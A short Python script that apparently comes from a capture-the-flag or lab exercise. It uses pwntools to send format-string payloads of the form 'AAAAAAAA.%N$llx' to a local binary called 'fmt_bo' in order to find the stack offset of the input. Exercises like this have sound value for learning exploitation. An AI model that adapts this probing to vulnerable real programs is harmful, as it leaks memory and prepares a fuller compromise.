#!/usr/bin/env python3

from pwn import *

context.log_level = "error"

exe = context.binary = ELF("./fmt_bo")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

for i in range(1, 30):
    io = start()
    payload = f"AAAAAAAA.%{i}$llx".encode()
    io.sendline(payload)
    io.sendline(b"aaaa")
    print(io.recvall(), i)
    io.close()
